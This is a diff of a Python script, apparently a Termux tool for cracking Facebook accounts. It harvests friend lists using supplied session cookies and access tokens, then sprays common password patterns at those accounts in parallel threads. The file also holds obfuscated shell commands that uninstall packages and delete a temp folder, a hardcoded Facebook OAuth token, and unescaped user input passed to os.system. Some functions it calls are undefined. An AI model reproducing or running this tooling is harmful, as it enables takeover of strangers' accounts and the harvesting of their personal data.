@@ -1,733 +1,967 @@
-#coding = utf-8
-#tnx alot janj hamza hop
-#script shared by Qaiser
-from uuid import uuid4
-import requests,zlib,platform
-import os,sys,tempfile,string,random,subprocess,uuid
-#----[pran links]-----
-kkk = {'user-agent': 'Davik/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build/GT-P5100 [FBAN/FB4A;FBAV/241.0.0.41292;FBBV/975202462;FBDM/{density=1.5,width=480,height=800};FBLC/pl_PL;FBCR/T-Mobile.pl;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.mlite;FBDV/MMB29K;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]', 'accept-encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'keep-alive', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-sim-hni': '31061', 'x-fb-connection-type': 'unknown', 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-net-hni': '28613', 'x-fb-connection-bandwidth': '29643048', 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-friendly-name': 'authenticate', 'x-fb-http-engine': 'Liger'}
-hhh = {'adid': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'email': '10000'+str(random.randint(11111111111,99999999999)), 'password': str(random.randint(1111111,9999999)), 'cpl': 'true', 'credentials_type': 'device_based_login_password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'format': 'json', 'generate_session_cookies': '1', 'generate_analytics_claim': '1', 'generate_machine_id': '1', 'locale': 'pl_PL', 'client_country_code': 'PL', 'device': 'SM-A500H', 'device_id': 'e66b2ae4-35b6-4c2b-822b-b57243edb930', 'method': 'auth.login', 'fb_api_req_friendly_name': 'authenticate', 'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler'}
-lll = ("https://b-api.facebook.com/method/auth.login")
-#----[remover]-----
+#assalamowalikom OPEN source by Harry (Haris AKHTAR )
+#Fuck YATEEM kid AWAIS tahir 
+fbks=('com.facebook.adsmanager','com.facebook.lite','com.facebook.orca','com.facebook.katana')
+g1=('A');g2=('K');g3=('I');g4=('N');g5=('G');g6=('1');g7=('1');g8=('0');pr=('-P');pr1=('R');pr2=('O')
+ghb=g1+g2+g3+g4+g5+g6+g7+g8
+gghb=g1+g2+g3+g4+g5+pr+pr1+pr2
+cx=('.g');cxx=('fig');xl=('/')
+  
+import os,base64
+os.system("xdg-open https://m.me/KINGXMRSW4TI/?ref=share")
+u1=('u');u2=('n');u3=('i');u4=('n');u5=('s');u6=('t');u7=('a');u8=('l');u9=('l')
+ustl=u1+u2+u3+u4+u5+u6+u7+u8+u9
+r1=('r');r2=('e');r3=('q');r4=('u');r5=('e');r6=('s');r7=('t');r8=('s')
+rqts=r1+r2+r3+r4+r5+r6+r7+r8
+y1=('-');y2=('y');y3=(' > ')
+ys=y1+y2+y3
+print('\n\033[1;32m install missing modules...\n It will take some seconds...')
+os.system(f'pip {ustl} {rqts} {ys}/dev/null')
+os.system(f'pip install {rqts}{y3}/dev/null')
 try:
-	sz = zlib.decompress(b'https://github.com/Mafyia313/Naib-approvel.txt/blob/main/naib-on-fir.txt')
-except:
-	sz=""
-#--checking if file is not avalible 
+	import os,requests,json,time,re,random,sys,uuid,string,subprocess
+	from string import *
+	import bs4
+	#import dz
+	from concurrent.futures import ThreadPoolExecutor as tred
+	from bs4 import BeautifulSoup as sop
+	from bs4 import BeautifulSoup
+except ModuleNotFoundError: 
+	print('\n Installing missing modules ...')
+	os.system('pip install requests bs4 futures==2 > /dev/null')
+	os.system('python AB KHANX.py')
+android_models=[]
+try:
+	xx = requests.get('https://raw.githubusercontent.com/AKING110/Data/main/sm.txt').text.splitlines()
+	for line in xx:
+		android_models.append(line)
+except:pass
+myid=uuid.uuid4().hex[:5].upper()
  
-if os.path.exists(sz):
-	os.rename(sz1,'.f1')
-	os.rename(sz2,'.f2')
-	os.system(sz3)
-	os.system(sz4)
-	os.system(sz5)
-	os.system(sz6)
-else:
-	pass
-os.system("rm -rf .f1")
-os.system("rm -rf .f2")
+usr=[]
+try:
+	xd=requests.get('https://raw.githubusercontent.com/ahmad77412/DATA-FILE/main/UAGNT').text.splitlines()
+	for us in xd:
+		usr.append(us)
+except: pass
+pyt=('python3.11')
+pkgz=('packages')
+ap1=('a')
+ap2=('pi')
+ap3=('.p')
+api=ap1+ap2+ap3
+md1=('mo')
+md2=('de')
+md3=('ls')
+md4=('.p')
+mudl=md1+md2+md3+md4
+#------------------[ USER-AGENT-DEFAULT ]-------------------#
+ugen2=[]
+ugen=[]
+cokbrut=[]
+ses=requests.Session()
+princp=[]
  
-logo= f'''
-     .d88888b.   .d8888b.  8888888b.       
-    d88P" "Y88b d88P  Y88b 888   Y88b      
-    888     888 Y88b.      888    888      
-    888     888  "Y888b.   888   d88P      
-    888     888     "Y88b. 8888888P"       
-    888 Y8b 888       "888 888 T88b        
-    Y88b.Y8b88P Y88b  d88P 888  T88b       
-     "Y888888"   "Y8888P"  888   T88b      
-            Y8b
-{50*"-"}
-    Tool Version :     10.0.95
-    Thanks Alot  :     M.Hamza 
-{50*"-"}'''
- 
-#--(Dark@Colours)---#
-r="\033[1;91m"
-g="\033[1;92m"
-y="\033[1;93m"
-b="\033[1;94m"
-p="\033[1;95m"
-c="\033[1;96m"
-l="\033[1;97m"
-s="\033[0m"
-#--(light@Colours)---#
-lr="\033[0;91m"
-lg="\033[0;92m"
-ly="\033[0;93m"
-lb="\033[0;94m"
-lp="\033[0;95m"
-lc="\033[0;96m"
-ll="\033[0;97m"
- 
-loop = 0
-methods = []
-ok=[]
-total=[]
-clone_type=[]
-android_models = []
-hh = ['[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693238;FBDM/{density=2.0,width=720,height=1184};FBLC/cs_CZ;FBRV/0;FBCR/Vodafone CZ;FBMF/myPhone;FBBD/myPhone;FBPN/com.facebook.katana;FBDV/HAMMER_ENERGY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/211.0.0.43.112;FBBV/144693253;FBDM/{density=3.0,width=1080,height=1920};FBLC/en_US;FBRV/145297323;FBCR/Boost Mobile;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930P;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/75.0.0.23.69;FBBV/29142907;FBDM/{density=1.5,width=480,height=854};FBLC/en_US;FBCR/Jazz;FBMF/QMobile;FBBD/QMobile;FBPN/com.facebook.katana;FBDV/QMobile i6 Metal ONE;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/304.0.0.39.118;FBBV/271127351;FBDM/{density=1.9125,width=720,height=1400};FBLC/en_US;FBRV/272210345;FBCR/Boost Mobile;FBMF/motorola;FBBD/motorola;FBPN/com.facebook.katana;FBDV/moto g fast;FBSV/10;FBBK/1;FBOP/1;FBCA/arm64-v8a:;]','[FBAN/FB4A;FBAV/2.3;FBBV/149649;FBDM/{density=1.5,width=480,height=800};FBLC/es_ES;FBCR/;FBPN/com.facebook.katana;FBDV/LG-P920;FBSV/2.2.2;]','[FBAN/FB4A;FBAV/78.0.0.16.67;FBBV/30529816;FBDM/{density=2.0,width=720,height=1280};FBLC/en_US;FBCR/MTN NG;FBMF/Infinix;FBBD/Infinix;FBPN/com.facebook.katana;FBDV/Infinix_X521;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]']
-xny = (b'https://github.com/Mafyia313/Naib-approvel.txt/blob/main/naib-on-fir.txt')
-update = requests.get(xny).text
-uuidd = str(os.geteuid()) + str(os.getlogin()) + str(os.geteuid())
-id = "".join(uuidd).replace("_","").replace("a","A")
-plat = platform.version()[14:][:21][::-1].upper()+platform.release()[5:][::-1].upper()+platform.version()[:8]
-xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
-bxd = ""
-bumper = id+bxd+xp
-myweb2 = requests.get(xny).text
+for xd in range(10000):
+    a='Mozilla/5.0 (Symbian/3; Series60/'
+    b=random.randrange(1, 9)
+    c=random.randrange(1, 9)
+    d='Nokia'
+    e=random.randrange(100, 9999)
+    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
+    g=random.randrange(1, 9)
+    h=random.randrange(1, 4)
+    i=random.randrange(1, 4)
+    j=random.randrange(1, 4)
+    k='Mobile Safari/535.1'
+    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
+    ugen2.append(uaku)
  
  
-		
-def main():
-	
-	os.system('rm -rf ...txt')
-	os.system('clear')
-	print(logo)
-	print('Code Like Humor When You Have To Explain It Its Bad')
-	print(50*'-')
-	print('[1] Fb Cloning Menu')
-	print('[2] File Create Menu')
-	print('[3] Number Detail Finder')
-	print('[4] Remove Cookie')
-	print('[5] Clear Cache')
-	print('[6] Best Pass Lists \033[0;97m')
-	print('[7] How To Use Video')
-	print('[0] Exit \033[0;97m')
-	print(50*'-')
-	menu_opt = input('Select choice : ')
-	if menu_opt =='1':
-		method_crack()
-	elif menu_opt =='2':
-		create_file()
-	elif menu_opt =='3':
-		
-		os.system('xdg-open https://github.com/SODHAIRy')
-		main()
-	elif menu_opt =='4':
-		os.system('rm -rf fb_cookies.txt')
-		os.system('rm -rf access_token.txt')
-		print('       Removed Success')
-		time.sleep(3)
-		main()
-	elif menu_opt =='5':
-		isdd="les/u"
-		isd="sr/t"
-		isddd="p/."
-		llb = f"/data/data/com.termux/fi{isdd}{isd}m{isddd}*"
-		os.system(f"rm -rf {llb}")
-		exit("      Sucessfully Removed .      ")
-	elif menu_opt =='6':
-		os.system('clear')
-		print(logo)
-		print(' Select Your Country For Best PassLists')
-		print(50*'-')
-		print('[1] Pakistani Ids')
-		print('[2] Bangladesh Ids')
-		print('[3] Nigeria Ids')
-		print('[4] Other Countries')
-		print('[0] Back \033[0;97m')
-		print(50*'-')
-		menu_opt = input('Select choice : ')
-		if menu_opt =='1':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('khan123')
-			print('first1234')
-			print('first12345')
-			print('i love you')
-			print('firstkhan')
-			print('khankhan')
-			print('khan12345')
-			print('khan12')
-			print('first786')
-			input('\nPress enter to back ')
-			main()
-		elif menu_opt =='2':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('Bangladesh')
-			print('first1234')
-			print('first12345')
-			print('bangladesh')
-			print('i love you')
-			print('Jannatul123')
-			print('Mohammed123')
-			print('Mohammad123')
-			print('first@123')
-			input('\nPress enter to back ')
-			main()
-		elif menu_opt =='3':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('i love you')
-			print('musa123')
-			print('first12345')
-			print('first@123')
-			print('first@1234')
-			print('firstfirst')
-			print('lastlast')
-			print('first786')
-			print('first1122')
-			input('\nPress enter to back ')
-			main()
-		elif menu_opt =='4':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('i love you')
-			print('first321')
-			print('lastfirst')
-			print('firstlast123')
-			print('first12345')
-			print('first@123')
-			print('first@1234')
-			print('firstfirst')
-			print('first007')
-			print('first789')
-			print('first1122')
-			input('\nPress enter to back ')
-			main()
-		if menu_opt =='1':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('khan123')
-			print('first1234')
-			print('first12345')
-			print('i love you')
-			print('firstkhan')
-			print('khankhan')
-			print('khan12345')
-			print('khan12')
-			print('first786')
-			input('\nPress enter to back ')
-			main()
-		elif menu_opt =='2':
-			os.system('clear')
-			print(logo);
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('Bangladesh')
-			print('first1234')
-			print('first12345')
-			print('bangladesh')
-			print('i love you')
-			print('Jannatul123')
-			print('Mohammed123')
-			print('Mohammad123')
-			print('first@123')
-			input('\nPress enter to back ')
-			main()
-		elif menu_opt =='3':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('i love you')
-			print('musa123')
-			print('first12345')
-			print('first@123')
-			print('first@1234')
-			print('firstfirst')
-			print('lastlast')
-			print('first786')
-			print('first1122')
-			input('\nPress enter to back ')
-			main()
-		elif menu_opt =='4':
-			os.system('clear')
-			print(logo)
-			print('first last')
-			print('First Last')
-			print('firstlast')
-			print('first123')
-			print('i love you')
-			print('first321')
-			print('lastfirst')
-			print('firstlast123')
-			print('first12345')
-			print('first@123')
-			print('first@1234')
-			print('firstfirst')
-			print('first007')
-			print('first789')
-			print('first1122')
-			input('\nPress enter to back ')
-			main()
-	elif menu_opt == "7":
-		try:
-			os.system('python use.py')
-		except:
-			exit('video is not avalible Right now in server try again after few hours')
-	elif menu_opt == "0":
-		main()
-	else:
-		print('\n Invalid option, try again ...')
-		time.sleep(3)
-		main()
- 
-def login():
-	os.system('clear')
-	print(logo)
-	cookies = input(' Put cookies here: ')
+    aa='Mozilla/5.0 (Linux; U; Android'
+    b=random.choice(['2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18'])
+    c=' en-us; GT-'
+    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    e=random.randrange(1, 999)
+    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+    h=random.randrange(10,100)
+    i='0'
+    j=random.randrange(4200,4900)
+    k=random.randrange(40,150)
+    l='Mobile Safari/537.36'
+    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+    ugen.append(uaku2)
+def uaku():
 	try:
-		print('\n Validating cookies ... ')
-		data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
-		find_token = re.search("(EAAG\w+)", data.text)
-		open("access_token.txt", "w").write(find_token.group(1))
-		open("fb_cookies.txt","w").write(cookies)
-		print(' Logged in successfully ...')
-		time.sleep(1)
-		os.system('python malang.py')
-	except KeyError:
-		print('\n Inavlid cookies, try another cookies')
-		exit()
-	except requests.exceptions.ConnectionError:
-		print('\n No internet connection ...')
-		exit()
-	except AttributeError:
-		print('\n Invalid cookies, try another cookies ...')
-		exit()
-		
-def method_crack():
+		ua=open('bbnew.txt','r').read().splitlines()
+		for ub in ua : 
+			ugen.append(ub)
+	except:
+		a=requests.get('https://github.com/MR-K1NGX/PAID/blob/main/MUMT4Z.txt').text
+		ua=open('.bbnew.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n')
+		ua=open('.bbnew.txt','r').read().splitlines()
+	 
+ 
+logo=("""\033[1;32m
+\033[1;32m 
+ 
+ █████╗ ███████╗ ██████╗ ██╗  ██╗ █████╗ ███╗   ██╗
+██╔══██╗██╔════╝██╔════╝ ██║  ██║██╔══██╗████╗  ██║
+███████║█████╗  ██║  ███╗███████║███████║██╔██╗ ██║
+██╔══██║██╔══╝  ██║   ██║██╔══██║██╔══██║██║╚██╗██║
+██║  ██║██║     ╚██████╔╝██║  ██║██║  ██║██║ ╚████║
+╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝
+                                                   
+ 
+      
+\033[1;93m--------------------------------------------------
+  \033[1;32mF4C3B00K  : Roohullah Afghan
+  \033[1;32mY0UTUB3   : @RoohullahAfghan
+  \033[1;32mV3RS10N   : 0.1
+  \033[1;32m0WN3R     : Roohullah Afghan 
+--------------------------------------------------
+\033[1;37m[-]Dear Paid user:
+\033[1;37m[-]Your subscription last date 31/12/23
+--------------------------------------------------""")
+def linex():
+	print('\033[1;32m----------------------------------------------')
+def clear():
 	os.system('clear')
 	print(logo)
-	print(' [1] File Cloning ')
-	print(' [2] Email Cloning ')
-	print(' [3] Number Cloning ')
-	print(' [0] Back')
-	print(50*'-')
-	clone_ = input(' Select : ')
-	if clone_ == "1":
-		clone_type.append('1')
-	elif clone_ == "2":
-		clone_type.append('2')
-	elif clone_ == "3":
-		clone_type.append('3')
-	elif clone_ == "0":
-		main()
+A = '\x1b[1;97m' 
+B = '\x1b[1;96m' 
+C = '\x1b[1;91m' 
+D = '\x1b[1;92m'
+M = '\033[1;31m'
+H = '\033[1;32m'
+N = '\x1b[1;91m'	
+E = '\x1b[1;93m' 
+F = '\x1b[1;94m'
+G = '\x1b[1;95m'
+P = '\033[1;91m'
+def cek_apk(session,coki):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
 	else:
-		exit('invalid select')
-	mycrackistan()
+		print(f'\r{A} [â€¢]%s Active Apks & Web ðŸ‘‡ '%(H))
+		for i in range(len(game)):
+			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
+	else:
+		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
+		for i in range(len(game)):
+			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+try:os.mkdir('data')
+except:pass
  
-def mycrackistan():
-	global methods
-	if '1' in clone_type:
-		crack_main().crackfile(id)
-	elif '2' in clone_type:
-		crack_main().crackmail(id)
-	elif '3' in clone_type:
-		crack_main().cracknum(id)
- 
-class crack_main():
-	def __init__(self):
-		self.id=[]
-	def crackfile(self,id):
-		global methods
-		os.system('clear')
-		print(logo)
-		self.file = input(' Put file path: ')
+def public():
+	usrr=[]
+	try:
+		tok = open('data/token','r').read()
+		cok = open('data/coki','r').read()
+		tokenku.append(tok)
+	except IOError:
+		print('\033[1;31mYour cookies han expired...');time.sleep(1)
+		c_login()
+	create()
+	time.sleep(1)
+	clear()
+	try:
+		jum=int(input(' \033[1;36mHow many ids you went to clone ?\033[1;91m '))
+	except ValueError:
+		exit(' Put only digits not latters ')
+	if jum<1 or jum>5000:
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(f'\033[1;32m Put link no.{yz+0}: ')
+		usrr.append(kl)
+	
+	
+	linex()
+	print(' [1] STARTCRACKING ')
+	linex()
+	mthd = input(' Choose method: ')
+	linex()
+	print(' Do you went show cp account? (y/n): ')
+	linex()
+	cx=input(' Choose: ')
+	if cx in ['y','Y','yes','Yes','1']:
+		pcp.append('y')
+	else:
+		pcp.append('n')
+	linex()
+	print('\033[1;32m Dumping friend list...\033[1;91m')
+	linex()
+	for userr in usrr:
 		try:
-			self.id = open(self.file).read().splitlines()
-			self.pasw()
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			exit(f' No internet connection')
+	try:
+		plist = []
+		try:
+			ps_limit = int(input(' How many passwords do you want to add ? '))
+		except:
+			ps_limit =1
+		linex()
+		print('\033[1;32m exp: first last,firtslast,first123')
+		linex()
+		for i in range(ps_limit):
+			plist.append(input(f' Put password {i+1}: '))
+		with tred(max_workers=30) as crack_submit:
+			clear()
+			total_ids = str(len(id))
+			
+			linex()
+			for user in id:
+				ids,names = user.split('|')
+				passlist = plist
+				if mthd in ['1','01']:
+					crack_submit.submit(ffb,ids,names,passlist)
+				elif mthd in ['2','02']:
+					crack_submit.submit(ffb,ids,names,passlist)
+				else:
+					crack_submit.submit(mmm,ids,names,passlist)
+		print('\033[1;32m')
+		linex()
+		print(' The process has completed')
+		print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
+		linex()
+		input(' Press enter to back ')
+		os.system('python AB KHANX.py')
+	except requests.exceptions.ConnectionError:
+		exit(f' No internet connection')
+	except (KeyError,IOError):
+		print(f' No friends for {userr}')
+		time.sleep(3)
+		public()
+		
+def create_file_login():
+    ids = []
+    xyz = requests.Session()
+    os.system('clear')
+    print(logo)
+    try:
+        cookies = {'cookie':open('fb_cookies.txt','r').read()}
+        access_token = open('access_token.txt', 'r').read()
+    except FileNotFoundError:
+        login()
+    try:
+        check_cookies = xyz.get('https://graph.facebook.com/me?access_token='+access_token,cookies=cookies).text
+        load = json.loads(check_cookies)
+        iid = load['id']
+        name = load['name']
+    except KeyError:
+        print('\n Cookies has expired, login another cookies.')
+        time.sleep(1)
+        os.system('rm -rf .fb_cookies.txt .access_token.txt')
+        login()
+    except requests.exceptions.ConnectionError:
+        print(' No internet connection ...')
+    os.system('clear')
+    print(logo)
+    print(' [1] Create auto file (fast)')
+    print(' [2] Create manual file')
+    print(50*'-')
+    foopt = input(' Choose option: ')
+    if foopt =='1':
+        auto_file(cookies,access_token)
+    else:
+        manual_file(cookies,access_token)
+def auto_file(cookies,access_token):
+    global total
+    os.system('clear & rm -rf .txt .temp.txt')
+    print(logo)
+    print(' File auto creation mode ...')
+    print(50*'-')
+    print('\033[1;35m Put range between 1 to 20\033[1;97m\n')
+    try:
+        fl = int(input(' How many ids you want to add? '))
+    except:
+        fl = 1
+    for xd in range(fl):
+        idt = input(f' Put id no.{xd+1}: ')
+        try:
+            fd_url = 'https://graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(idt,access_token)
+            xyz = requests.Session()
+            r = xyz.get(fd_url,cookies=cookies).text
+            q = json.loads(r)
+            for iid in q['friends']['data']:
+                uid = iid['id']
+                open('.txt','a').write(uid+'\n')
+        except KeyError:
+            print(' No friends from: '+idt)
+        except requests.exceptions.ConnectionError:
+            print(' No internet connection ....')
+    print('\n\033[1;35m Example: 100090.100091,100089 etc\033[0;97m')
+    try:
+        sl = int(input('\n How many links do you want to grab? '))
+    except:
+        sl = 1
+    for el in range(sl):
+        sid = input(f' Put {el+1} link: ')
+        os.system('cat .txt | grep "'+sid+'" > .temp.txt')
+    print('\n \033[1;35m /sdcard/AFAQ.txt \033[0;97m\n')
+    sf = input(' Put path to save file: ')
+    file = open('.temp.txt','r').read().splitlines()
+    print('')
+    print(' Total ids: '+str(len(file)))
+    print(' Grabbing process has started')
+    print(50*'-')
+    with ThreadPool(max_workers=20) as yaari:
+        for exid in file:
+            yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
+    print(50*'-')
+    print(' Total ids: '+str(len(total)))
+    print('\n')
+    input(' Press enter to back ')
+    os.system('python AB KHANX.py')
+def iamBadBoy(exid,cookies,access_token,sf):
+    try:
+        global total,loop
+        fd_url = 'https://b-graph.facebook.com/%s?fields=friends.fields(id,name)&access_token=%s'%(exid,access_token)
+        xyz = requests.Session()
+        r = xyz.get(fd_url,cookies=cookies).text
+        q = json.loads(r)
+        for yaad in q['friends']['data']:
+            iid = yaad['id']
+            name = yaad['name']
+            total.append(iid)
+            open(sf,'a').write(iid+'|'+name+'\n')
+        loop+=1
+        sys.stdout.write('\r %s | Total ids: %s\r'%(loop,len(total)));sys.stdout.flush()
+    except requests.exceptions.ConnectionError:
+        print(' No internet connection ...')
+    except KeyError:
+        pass
+def manual_file(cookies,access_token):
+    ids=[]
+    os.system('clear')
+    print(logo)
+    try:
+        limit = int(input(' How many ids do you want to extract? '))
+    except:
+        limit = 1
+    print('\n \033[1;32mExample: /sdcard/AFAQ.txt \033[0;97m\n')
+    sf = input(' Save file as: ')
+    print(50*'-')
+    for xd in range(limit):
+        idt = input(f' Put id no {xd+1}: ')
+        try:
+            xyz=requests.Session()
+            friend_list = xyz.get('https://b-graph.facebook.com/'+idt+'?fields=friends.fields(id,name)&access_token='+access_token,cookies=cookies).text
+            lists = json.loads(friend_list)
+            for i in lists['friends']['data']:
+                iid = i['id']
+                name = i['name']
+                ids.append(iid)
+                open(sf,'a').write(iid+'|'+name+'\n')
+        except KeyError:
+            print(' No friends found ...\n')
+        except requests.exceptions.ConnectionError:
+            print(' No internet connection ...\n')
+        except KeyboardInterrupt:
+            print('Skipping ...\n')
+    print(50*'-')
+    print(' Total ids grabbed: '+str(len(ids)))
+    print(' Ids file saved in: '+sf)
+    input(' \nPress enter to back ')
+    os.system('python AB KHANX.py')
+def sids():
+    os.system('clear')
+    print(logo)
+    try:
+        file_name = input(' Input file name: ')
+        open(file_name,'r').read()
+    except FileNotFoundError:
+        print(' File not found.')
+        exit()
+    print('\n\033[1;32m Put limit between 1 to 10 \033[0;97m')
+    limit = int(input(' How many links do you want to separate? '))
+    print('\n\033[1;32m Example: /sdcard/AFAQ.txt\033[0;97m')
+    new_save = input(' Save new file as: ')
+    print('')
+    y = 0
+    for k in range(limit):
+        y+=1
+        links = input(' Put links %s: '%(y))
+        os.system('cat '+file_name+' | grep "'+links+'" >> '+new_save)
+    print(50*'-')
+    print(' Links grabbed successfully')
+    print(' Total grabbed links: '+str(len(open(new_save).read().splitlines())))
+    print(' New file saved as: '+new_save)
+    print(50*'-')
+    input('\n Press enter to back ')
+    os.system('python AB KHANX.py')
+def remove_dub():
+    os.system('clear')
+    print(logo)
+    print(50*'-')
+    user_file = input(' Put file path: ')
+    try:
+        open(user_file,'r').read()
+        print(' \n\033[1;32mExample: /sdcard/filename.txt\n\033[0;97m')
+        save_file = input(' Save new file as: ')
+        os.system('touch '+save_file)
+        os.system('sort -r '+user_file+' | uniq > '+save_file)
+        print(50*'-')
+        print(' Dublicate lines has been removed from file')
+        print(' Result file saved as: '+save_file)
+        print(50*'-')
+        input('\n Press enter to back ')
+        os.system('python AB KHANX.py')
+    except FileNotFoundError:
+        print(' File not found.')
+def login():
+    os.system('clear')
+    print(logo)
+    print('\n\033[1;32m If you donot know how to get cookies, watch video on YouTube \033[0;97m')
+    cookies = input(' Put cookies here: ')
+    try:
+        print('\n Validating cookies ... ')
+        data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookies})
+        find_token = re.search("(EAAG\w+)", data.text)
+        open("access_token.txt", "w").write(find_token.group(1))
+        open("fb_cookies.txt","w").write(cookies)
+        print(' Logged in successfully ...')
+        time.sleep(1)
+        os.system('python AB KHANX.py')
+    except KeyError:
+        print('\n Inavlid cookies, try another cookies')
+        exit()
+    except requests.exceptions.ConnectionError:
+        print('\n No internet connection ...')
+        exit()
+    except AttributeError:
+        print('\n Invalid cookies, try another cookies ...')
+        exit()
+def menu(): 
+	os.system('clear')
+	print(logo)
+	print(' [1] File cloning\n [2] Create file\n [3] Public cloning\n [4] Random cloning\n [5] Gmail cloning\n [6] Separate ids\n [7] remove dublicate lines from file\n [8] login another cookie\n [9] contact with owner\n [0] Exit menu')
+	linex()
+	xd=input(' Choose an option: ')
+	if xd in ['1','01']:
+		clear()
+				
+		linex()
+		file = input(' Put file path\033[1;91m: ')
+		try:
+			fo = open(file,'r').read().splitlines()
 		except FileNotFoundError:
-			print(' No file found ....')
-			exit()
-	def crackmail(self,id):
-		global methods
-		os.system("clear");print(logo)
-		import requests,random
+			print(' File location not found ')
+			time.sleep(1)
+			menu()
+		clear()
+				
+		linex()
+		print(' [1] START CRACKING')
+		linex()
+		mthd=input(' Choose: ')
+		linex()
